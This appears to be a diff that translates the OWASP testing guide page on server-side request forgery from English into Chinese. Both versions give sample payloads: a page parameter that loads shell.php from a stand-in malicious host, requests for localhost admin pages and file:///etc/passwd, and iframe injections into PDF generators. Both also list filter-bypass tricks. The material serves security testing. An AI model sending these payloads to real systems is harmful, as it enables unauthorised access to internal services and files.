@@ -1,110 +1,110 @@
-# Testing for Server-Side Request Forgery
+# 测试服务器端请求伪造
 
 |ID          |
 |------------|
 |WSTG-INPV-19|
 
-## Summary
+## 概述
 
-Web applications often interact with internal or external resources. While you may expect that only the intended resource will be handling the data you send, improperly handled data may create a situation where injection attacks are possible. One type of injection attack is called Server-side Request Forgery (SSRF). A successful SSRF attack can grant the attacker access to restricted actions, internal services, or internal files within the application or the organization. In some cases, it can even lead to Remote Code Execution (RCE).
+Web应用程序经常与内部或外部资源交互。虽然您可能期望只有目标资源会处理您发送的数据，但处理不当可能导致注入攻击的可能性。一种这样的注入攻击称为服务器端请求伪造（SSRF）。成功的SSRF攻击可以授予攻击者对应用程序或组织内的受限操作、内部服务或内部文件的访问权限。在某些情况下，它甚至可能导致远程代码执行（RCE）。
 
-## Test Objectives
+## 测试目标
 
-- Identify SSRF injection points.
-- Test if the injection points are exploitable.
-- Asses the severity of the vulnerability.
+- 识别SSRF注入点。
+- 测试注入点是否可利用。
+- 评估漏洞的严重程度。
 
-## How to Test
+## 如何测试
 
-When testing for SSRF, you attempt to make the targeted server inadvertently load or save content that could be malicious. The most common test is for local and remote file inclusion. There is also another facet to SSRF: a trust relationship that often arises where the application server is able to interact with other back-end systems that are not directly reachable by users. These back-end systems often have non-routable private IP addresses or are restricted to certain hosts. Since they are protected by the network topology, they often lack more sophisticated controls. These internal systems often contain sensitive data or functionality.
+测试SSRF时，您尝试使目标服务器无意中加载或保存可能恶意的内容。最常见的测试是本地和远程文件包含。还有SSRF的另一个方面：一种信任关系经常出现，应用程序服务器能够与用户不能直接访问的其他后端系统交互。这些后端系统通常具有不可路由的私有IP地址或仅限于某些主机。由于它们受网络拓扑保护，它们通常缺乏更复杂的控制。这些内部系统通常包含敏感数据或功能。
 
-Consider the following request:
+考虑以下请求：
 
 ``` http
 GET https://example.com/page?page=about.php
 ```
 
-You can test this request with the following payloads.
+您可以使用以下有效载荷测试此请求。
 
-### Load the Contents of a File
+### 加载文件内容
 
 ```http
 GET https://example.com/page?page=https://malicioussite.com/shell.php
 ```
 
-### Access a Restricted Page
+### 访问受限页面
 
 ```http
 GET https://example.com/page?page=http://localhost/admin
 ```
 
-Or:
+或者：
 
 ```http
 GET https://example.com/page?page=http://127.0.0.1/admin
 ```
 
-Use the loopback interface to access content restricted to the host only. This mechanism implies that if you have access to the host, you also have privileges to directly access the `admin` page.
+使用loopback接口访问仅限主机的内容。这意味着如果您有权访问主机，您也有权直接访问`admin`页面。
 
-These kind of trust relationships, where requests originating from the local machine are handled differently than ordinary requests, are often what enables SSRF to be a critical vulnerability.
+这种信任关系（其中来自本地机器的请求与普通请求的处理方式不同）通常是SSRF成为严重漏洞的原因。
 
-### Fetch a Local File
+### 获取本地文件
 
 ```http
 GET https://example.com/page?page=file:///etc/passwd
 ```
 
-### HTTP Methods Used
+### 使用的HTTP方法
 
-All of the payloads above can apply to any type of HTTP request, and could also be injected into header and cookie values as well.
+上述所有有效载荷可以应用于任何类型的HTTP请求，也可以注入到头和cookie值中。
 
-One important note on SSRF with POST requests is that the SSRF may also manifest in a blind manner, because the application may not return anything immediately. Instead, the injected data may be used in other functionality such as PDF reports, invoice or order handling, etc., which may be visible to employees or staff but not necessarily to the end user or tester.
+关于带POST请求的SSRF的一个重要说明是，SSRF也可能以盲目的方式表现，因为应用程序可能不会立即返回任何内容。相反，注入的数据可能在其他功能中使用，如PDF报告、发票或订单处理等，这些可能对员工可见，但不一定对最终用户或测试人员可见。
 
-You can find more on Blind SSRF [here](https://portswigger.net/web-security/ssrf/blind), or in the [references section](#references).
+您可以在[此处](https://portswigger.net/web-security/ssrf/blind)找到更多关于盲SSRF的信息，或在[参考资料部分](#参考资料)查看。
 
-### PDF Generators
+### PDF生成器
 
-In some cases, a server may convert uploaded files to PDF format. Try injecting `<iframe>`, `<img>`, `<base>`, or `<script>` elements, or CSS `url()` functions pointing to internal services.
+在某些情况下，服务器可能会将上传的文件转换为PDF格式。尝试注入`<iframe>`、`<img>`、`<base>`或`<script>`元素，或指向内部服务的CSS `url()`函数。
 
 ```html
 <iframe src="file:///etc/passwd" width="400" height="400">
 <iframe src="file:///c:/windows/win.ini" width="400" height="400">
 ```
 
-### Common Filter Bypass
+### 常见过滤器绕过
 
-Some applications block references to `localhost` and `127.0.0.1`. This can be circumvented by:
+一些应用程序阻止对`localhost`和`127.0.0.1`的引用。可以通过以下方式绕过：
 
-- Using alternative IP representation that evaluate to `127.0.0.1`:
-    - Decimal notation: `2130706433`
-    - Octal notation: `017700000001`
-    - IP shortening: `127.1`
-- String obfuscation
-- Registering your own domain that resolves to `127.0.0.1`
+- 使用评估为`127.0.0.1`的替代IP表示：
+  - 点分十进制表示法：`2130706433`
+  - 八进制表示法：`017700000001`
+  - IP缩短：`127.1`
+- 字符串混淆
+- 注册解析为`127.0.0.1`您自己的域
 
-Sometimes the application allows input that matches a certain expression, like a domain. That can be circumvented if the URL schema parser is not properly implemented, resulting in attacks similar to [semantic attacks](https://tools.ietf.org/html/rfc3986#section-7.6).
+有时应用程序允许匹配某个表达式的输入，如域名。如果URL模式解析器未正确实现，则可能导致类似于[语义攻击](https://tools.ietf.org/html/rfc3986#section-7.6)的攻击。
 
-- Using the `@` character to separate between the userinfo and the host: `https://expected-domain@attacker-domain`
-- URL fragmentation with the `#` character: `https://attacker-domain#expected-domain`
-- URL encoding
-- Fuzzing
-- Combinations of all of the above
+- 使用`@`字符在userinfo和host之间分隔：`https://expected-domain@attacker-domain`
+- 使用`#`字符的URL分段：`https://attacker-domain#expected-domain`
+- URL编码
+- 模糊测试
+- 以上所有组合
 
-For additional payloads and bypass techniques, see the [references](#references) section.
+有关其他有效载荷和绕过技术，请参阅[参考资料](#参考资料)部分。
 
-## Remediation
+## 修复
 
-SSRF is known to be one of the hardest attacks to defeat without the use of allow lists that require specific IPs and URLs to be allowed. For more on SSRF prevention, read the [Server Side Request Forgery Prevention Cheatsheet](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html).
+SSRF被称为最难防御的攻击之一，如果不使用需要允许特定IP和URL的允许列表。请阅读[服务器端请求伪造防范速查表](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html)以了解更多关于SSRF预防的信息。
 
-## References
+## 参考资料
 
-- [swisskyrepo: SSRF Payloads](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery)
-- [Reading Internal Files Using SSRF Vulnerability](https://medium.com/@neerajedwards/reading-internal-files-using-ssrf-vulnerability-703c5706eefb)
-- [Abusing the AWS Metadata Service Using SSRF Vulnerabilities](https://blog.christophetd.fr/abusing-aws-metadata-service-using-ssrf-vulnerabilities/)
-- [OWASP Server Side Request Forgery Prevention Cheatsheet](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html)
-- [Portswigger: SSRF](https://portswigger.net/web-security/ssrf)
-- [Portswigger: Blind SSRF](https://portswigger.net/web-security/ssrf/blind)
-- [Bugcrowd Webinar: SSRF](https://www.bugcrowd.com/resources/webinars/server-side-request-forgery/)
-- [Hackerone Blog: SSRF](https://www.hackerone.com/blog-How-To-Server-Side-Request-Forgery-SSRF)
-- [Hacker101: SSRF](https://www.hacker101.com/sessions/ssrf.html)
-- [URI Generic Syntax](https://tools.ietf.org/html/rfc3986)
+- [swisskyrepo：SSRF有效载荷](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery)
+- [使用SSRF漏洞读取内部文件](https://medium.com/@neerajedwards/reading-internal-files-using-ssrf-vulnerability-703c5706eefb)
+- [使用SSRF漏洞滥用AWS元数据服务](https://blog.christophetd.fr/abusing-aws-metadata-service-using-ssrf-vulnerabilities/)
+- [OWASP服务器端请求伪造防范速查表](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html)
+- [Portswigger：SSRF](https://portswigger.net/web-security/ssrf)
+- [Portswigger：盲SSRF](https://portswigger.net/web-security/ssrf/blind)
+- [Bugcrowd网络研讨会：SSRF](https://www.bugcrowd.com/resources/webinars/server-side-request-forgery/)
+- [Hackerone博客：SSRF](https://www.hackerone.com/blog-How-To-Server-Side-Request-Forgery-SSRF)
+- [Hacker101：SSRF](https://www.hacker101.com/sessions/ssrf.html)
+- [URI通用语法](https://tools.ietf.org/html/rfc3986)
